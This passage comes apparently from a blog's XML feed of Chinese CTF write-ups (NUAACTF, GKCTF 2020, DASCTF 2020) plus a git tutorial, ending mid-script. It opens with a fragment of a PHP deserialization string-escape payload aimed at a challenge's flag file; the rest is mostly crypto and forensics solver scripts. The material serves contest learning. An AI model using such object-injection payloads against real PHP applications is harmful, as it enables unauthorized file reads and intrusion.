class="string">&#x27;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;fflaglag.php&quot;;&#125;&#125;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo serialize(new B());</span></span><br><span class="line"><span class="keyword">echo</span> filter_nohack(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="假笑男孩"><a href="#假笑男孩" class="headerlink" title="假笑男孩"></a>假笑男孩</h2><blockquote><p>题目：当你看到他的假笑，你就看到了flag<br>外加一个<a href="https://pan.baidu.com/s/1biYwPBZSLUX6mMx7laobMQ"><strong>附件</strong></a>（提取码：ivqg）</p></blockquote><p>解题思路：<br>打开附件图片很明显图片应该是被改了高度，于是winhex改下高度（把7C-&gt;CE）便得到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3419526214.png"></p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>题目：流量分析听过么<br>外加<a href="https://pan.baidu.com/s/1qkIARq-GYo1ZWtVLbOC4XQ"><strong>附件</strong></a>（提取码：g99i）</p></blockquote><p>解题思路：<br>过滤http<br>第一个右键追踪http流</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3976240940.png"></p><h2 id="babyhttp"><a href="#babyhttp" class="headerlink" title="babyhttp"></a>babyhttp</h2><blockquote><p>题目：你知道什么是 HTTP 吗？（你通过一般方式是打不开网站的） Hint: The newest.     106.14.153.173 8443</p></blockquote><p>解题思路：</p><h2 id="babysdn"><a href="#babysdn" class="headerlink" title="babysdn"></a>babysdn</h2><blockquote><p>题目：网络领域有个很火的研究领域叫做SDN，那么你知道SDN可以做什么吗？<br>外加<a href="https://pan.baidu.com/s/1KJNRKfYbQjPKNjbR_TOgAg"><strong>附件</strong></a>（提取码：4tqs）</p></blockquote><p>解题思路:</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h2><blockquote><p>题目：ZmxhZ3t0aGlzX2lzX3JlYWlseV9jaGVjazFufQ==</p></blockquote><p>解题思路：<br>base64直接得到flag</p><h2 id="BruTE-RSA"><a href="#BruTE-RSA" class="headerlink" title="BruTE_RSA"></a>BruTE_RSA</h2><blockquote><p>题目：RSA!!!!RSA!!!!BRUTE TO GET ANSWET!!!!!!!!!!!<br>外加<a href="https://pan.baidu.com/s/1AMINnsbA6RCH2P5qRWa8wg"><strong>附件</strong></a>（提取码：s2wj）</p></blockquote><p>解题思路：<br>脚本一把梭哈</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2256587298.png"></p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">    e,n=(<span class="number">65537</span>, <span class="number">28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873</span>)</span><br><span class="line">    enc = [<span class="number">14765505659704388743616301253113404978973036615434543467291787063794853415443968447959471191502871327842007582193254954935225085964793898246044520718579206673198788548223402073410975385387693589482235535922205342040654898190651699673461841349817879859547738827158993445539388974095437440553515593043557648807</span>, <span class="number">2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732</span>, <span class="number">21617442555922665335003358556294294909187675782115332690799733331050423993084437815407074404916831963972996250287968498545085187385399453596033041024572405343861256748315571881946459758027781418048747455833279362845979940372523947345690345032301120487629036754902398646347412656580163307412681787740326750664</span>, <span class="number">19348488683349923919342516509447021301746908048804474589065296857691964147685313468743094214731368033049009363513595472264453418344479015479950114621314151879917864993370204552541811013392195313132212094385213307392785310155965672154730876755558332642480036174252524027472919787968385243506253357608920063714</span>, <span class="number">20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307</span>, <span class="number">4495435878782180842982598979426848915852309873951905660784792756061068459745710732551595437224048091881417293289266990062187024491087558766616793894302825089791068743147292750307839875294040412901324620528855104301423793144510274139088687721663452221761938305437162345452537045550568167370305116690051809783</span>, <span class="number">7661724340183101803591438713865416768017391036182721504091980175077745408041746171218955895291610457305692166626410041038406057265635459620914206831469173220106400383322269228580211741720875953586267934600483199784699180072179352772979897002989476042210549203971233854410479608166774751479330366431269265143</span>, <span class="number">24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261</span>, <span class="number">11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359</span>, <span class="number">26776010333646450951505049676798517095081501649769062476875716987657158152377399163942730185158271646633743195869088200844528079059295287584662315673931850954417499218402302988583172752092835706460505394013520642399572786659316981175560215257281870309157885279753459530446588724712091187670587598328257057843</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477</span>, <span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176</span>, <span class="number">5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449</span>, <span class="number">6299797715315883788568386920153946350102184029350495209512618821428500521839407821906928005187309243941446249274962920569784287027218357127017163201212917410884120132324167402443661321018326446492786599536322735596548965777531626163278557739549793540563082341626824289439450641992070425122260023203460024220</span>, <span class="number">23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(bytes_to_long(<span class="built_in">chr</span>(j)),e,n) == i:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h2 id="FFRREEQQ-RSA"><a href="#FFRREEQQ-RSA" class="headerlink" title="FFRREEQQ_RSA"></a>FFRREEQQ_RSA</h2><blockquote><p>题目：听说话多的人守不住秘密？ 注意：本题的答案不会有直接形如 flag{i_am_flag} 这样的答案，但是你会看到类似的内容 FLAG IS I AM FLAG 只需要提交 flag{I_AM_FLAG} 即可<br>外加<a href="https://pan.baidu.com/s/1z-mJy6bg-8JMmRBkBEMbyg"><strong>附件</strong></a>（提取码：0z7a）</p></blockquote><p>解题思路：<br>打开output.txt，可以发现被加密的字符内容特别长，其实也就说明了这段内容其实可以用词频分析来猜测每一个加密字符到底是啥<br>这里注意一点，这里由于没有限制加密的一定是英文这里出现频率最高的其实是空格。通过脚本的方式将密文内容替换成比较简单的字符形式（RSA能够保证每个ascii字符加密得到的密文是不重复的），然后就能够通过分析字符出现频率来分析密文啦。<br><a href="http://quipqiup.com/index.php"><strong>点我</strong></a></p><blockquote><p>DONBT STARVE IS A MARVELOUS SURVIVAL GAMEZTHE GAME OPENS WITH MAXWELL SNIDELY COMMENTING ON THE PLAYERBS GAUNT APPEARANCE AND INCLUDES LITTLE FURTHER STORYZTHE GAMEBS SETUP IS TOLD FURTHER THROUGH ITS TRAILERJ ON A DARK AND STORMY NIGHT[ WILSON APPEARS TO E GETTING NOWHERE IN A CHEMISTRY EXPERIMENT UNTIL HE IS STARTLED Y HIS RADIO SPEAKING TO HIMZ IT REVEALS THAT IT HAS NOTICED HIS TROULE AND HAS SECRET KNOWLEDGE OF HIMZ WHEN HE EAGERLY AGREES[ A FLURRY OF E]UATIONS AND DIAGRAMS ENCIRCLE HIM AND FILL HIS HEADZ USING WHITE RATS[ A TYPEWRITER[ AND HIS LOOD AMONG OTHER TOOLS AND MATERIALS[ WILSON CREATES A GIANT MACHINEZ THE RADIO COMMENDS HIS WORK AND TELLS HIM TO PULL THE MACHINEBS SWITCHZ HE HESITATES[ UT AT THE RADIOBS INSISTENCE[ HE DOES SOZ THE MACHINE RATTLES VIOLENTLY[ AND A PAIR OF GHOSTLY ARMS WHISK HIM INTO A DIFFERENT WORLD WHILE AN APPARITION OF MAXWELL CACKLESZTHE FLAG IS THIS IS ALSO FAKE RSA</p></blockquote><p>最后看到FLAG IS THIS IS ALSO FAKE RSA<br>得到flag：flag{THIS_IS_ALSO_FAKE_RSA}</p><h2 id="RREAL-RSA"><a href="#RREAL-RSA" class="headerlink" title="RREAL_RSA"></a>RREAL_RSA</h2><blockquote><p>题目：I AM RSA<br>外加<a href="https://pan.baidu.com/s/1-nX-OwYxB084CdYWpzAQ3Q"><strong>附件</strong></a>（提取码：ifs4）</p></blockquote><p>解题思路：<br>用yafu算出p，q，脚本一把梭哈</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4184594191.png"></p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">1106081963347301781444155926534938643298217639670251381867474826890728970307</span></span><br><span class="line">p = <span class="number">167622749606696848477732277529837832463</span></span><br><span class="line">q = <span class="number">6598638704725743849027686163703739789</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">681873475888907291485502809441689140305197371659486141705279050132490452420</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="Certificate-Authority"><a href="#Certificate-Authority" class="headerlink" title="Certificate Authority"></a>Certificate Authority</h2><blockquote><p>题目：圆锥曲线？双曲线？还是椭圆曲线？不过首先得从证书里面找点线索呀<br>外加<a href="https://pan.baidu.com/s/1H3THVKKvY4tiMe9q4xa_CA"><strong>附件</strong></a>（提取码：siud）</p></blockquote><p>解题思路：<br>考查加密算法：Menezes-Vanstone cryptosystem</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NUAACTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git基操</title>
      <link href="2020/05/28/git%E5%9F%BA%E6%93%8D/"/>
      <url>2020/05/28/git%E5%9F%BA%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：由于发现之前一个附件被某盘吃掉了（还好有备份，于是就选择了上传到github上，在此记录一下，大佬勿喷~</p></blockquote><p>首先Create repository<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2436960897.png"></p><p>接着找到自己喜欢的磁盘位置，打开git base，输入git clone <a href="https://github.com/SMU-harvey/Harvey.git">https://github.com/SMU-harvey/Harvey.git</a><br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3668292680.png"></p><p>打开对应位置显示出git的文件夹即为成功，然后将想要上传的文件放进去即可</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3202497770.png"></p><p>最后输入以下三行命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;提交的描述&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2906346618.png"></p><p>这时你就可以成功访问此网站，下载你上传的文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1903117362.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF 2020</title>
      <link href="2020/05/25/2020GKCTF/"/>
      <url>2020/05/25/2020GKCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="小学生的密码学"><a href="#小学生的密码学" class="headerlink" title="小学生的密码学"></a>小学生的密码学</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1763095233.png"></p><p><a href="https://blog.csdn.net/x_yhy/article/details/83756908?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-4"><strong>参考文章</strong></a></p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>通过这篇帖子知道了仿射密码，但是我不会写这脚本，通过手工解出来的明文，字太丑手稿就不发出来了<br>最后base64一转就出来最终的flag了<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/425020404.png"></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>改编了某大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affine</span>(<span class="params">a,b</span>):</span></span><br><span class="line">  pwd = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    pwd_dic[<span class="built_in">chr</span>(((a*i+b)%<span class="number">26</span>+<span class="number">97</span>))] = <span class="built_in">chr</span>(i+<span class="number">97</span>)</span><br><span class="line">  <span class="keyword">return</span> pwd_dic</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  pwd_dic = &#123;&#125;</span><br><span class="line">  pwd = <span class="string">&#x27;welcylk&#x27;</span></span><br><span class="line">  pwd = pwd.lower()</span><br><span class="line">  plain = []</span><br><span class="line">  pwd_dic = affine(<span class="number">11</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">      plain.append(pwd_dic[i])</span><br><span class="line">  <span class="built_in">print</span> (<span class="string">&quot;Flag is :&quot;</span> + <span class="string">&quot;&quot;</span>.join(plain))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2611462777.png"></p><h2 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a>Pokémon</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2330892157.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/388820451.png"></p><p>（这提示看不出来有啥用~<br> <a href="https://pan.baidu.com/s/1AiZScErID_wGU3fxL9GEqQ"><strong>附件</strong></a>（提取码：amlx）</p><p>一开始用处理器开外挂发现并没啥用，就一直打到满级都没见着flag<br>后来根据题目用了传说中的金手指到的103道路，一开始还以为又失败了，定睛一看flag不就是在103地图上，就这样花了一下午做出了这题<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4201938049.png"></p><blockquote><p>这次作为web手的我依旧没做出web的题，希望下次比赛web题能出的阳间一点</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF五月赛&amp;&amp;BJDCTF3th 2020</title>
      <link href="2020/05/24/2020DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B/"/>
      <url>2020/05/24/2020DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1928111371.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1521517348.png"></p><p>科学上网，F12查看问卷答案</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1887446240.png"></p><p>输入正确答案后，即可发现出现一串字符，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2834624861.png"></p><p>最后连在一块就是最终的flag</p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2651224114.png"></p><p>抖肩舞，很骚的页面，先把附件下下来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1097970678.png"></p><p><a href="https://pan.baidu.com/s/12JmreLhncSY9u9dq4EQ3mQ"><strong>附件</strong></a>（提取码：m5lv）<br>打开附件发现需要密码，通过阅读参考文章得到密码：zerowidthcharactersinvisible</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3517458906.png"></p><p>解压出来是一张图片，然后010看，反转hex<br>附上反转脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f &#x3D; open(&#39;f14g.png&#39;,&#39;rb&#39;).read()</span><br><span class="line">f2 &#x3D; list(f)</span><br><span class="line">f3 &#x3D; f2[::-1]</span><br><span class="line">#print f3</span><br><span class="line">f4 &#x3D; &#39;&#39;.join(f3)</span><br><span class="line">with open(&#39;f1ag.png&#39;,&#39;wb&#39;) as f:</span><br><span class="line">    f.write(f4)</span><br></pre></td></tr></table></figure><p>得到一张奇葩图片，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4194615657.png"></p><p>接着硬搜找到加密方式</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1575066815.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2912689633.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1773277287.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/704471714.png"></p><p>再结合文档所给的提示得到最终的flag<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/507711824.png"></p><h2 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2911746332.png"></p><p><a href="https://pan.baidu.com/s/1kggw00jnKEEO71srmp-wfw"><strong>附件</strong></a>（提取码：4pwu）</p><p>打开附件，定睛一看其实可以发现这可能就是个二维码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3664011646.png"></p><p>菜鸡的我写不来脚本，只能用画图工具来画,棒棒糖的方块画黑色的,然后反选白色的，得到二维码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3935891707.png"></p><p>最后扫一下，md5一转就O了</p><p>附上大佬做法：<br>肉眼+pil<br><a href="https://pan.baidu.com/s/1Gol74pJe1YwifiqSzzhswg"><strong>脚本</strong></a>（提取码：aei4）<br>同样得到二维码：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1404278893.png"></p><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>填完即可拿到flag了</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1876243242.png"></p><p><a href="https://pan.baidu.com/s/1095-ts7p7N2d1wxuWjUBmg"><strong>附件</strong></a>（提取码：obks）</p><p>很明显这题写个反推脚本，一把梭哈</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2150119991.png"></p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = <span class="string">&quot;flag&quot;</span></span><br><span class="line">_flag = <span class="string">&quot;177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d&quot;</span></span><br><span class="line">A = <span class="number">57</span></span><br><span class="line">SALT = <span class="string">&quot;ahh&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">m, a, si</span>):</span></span><br><span class="line">  c = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">2</span>):</span><br><span class="line">     s = m[i]+m[i+<span class="number">1</span>]</span><br><span class="line">     p = <span class="built_in">ord</span>(<span class="built_in">next</span>(si))</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(((j) * a + p) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) == s:</span><br><span class="line">            c += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">  print(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, a, si</span>):</span></span><br><span class="line">  c=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    c+=<span class="built_in">hex</span>(((<span class="built_in">ord</span>(m[i])) * a + <span class="built_in">ord</span>(<span class="built_in">next</span>(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="comment">#取16进制</span></span><br><span class="line">  <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span>():</span></span><br><span class="line">  a = A</span><br><span class="line">  salt = SALT</span><br><span class="line">  si = cycle(salt.lower())</span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    a = i</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt = <span class="built_in">list</span>(salt) <span class="comment">#97-122</span></span><br><span class="line">        salt[<span class="number">2</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(salt[<span class="number">2</span>]) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(salt[<span class="number">2</span>]) &gt; <span class="number">122</span>:</span><br><span class="line">            salt[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            salt[<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(salt[<span class="number">1</span>]) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(salt[<span class="number">1</span>]) &gt; <span class="number">122</span>:</span><br><span class="line">            salt[<span class="number">1</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            salt[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(salt[<span class="number">0</span>]) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(salt[<span class="number">0</span>]) &gt; <span class="number">122</span>:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            salt[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">        salt = <span class="string">&quot;&quot;</span>.join(salt)</span><br><span class="line">        si = cycle(salt.lower())</span><br><span 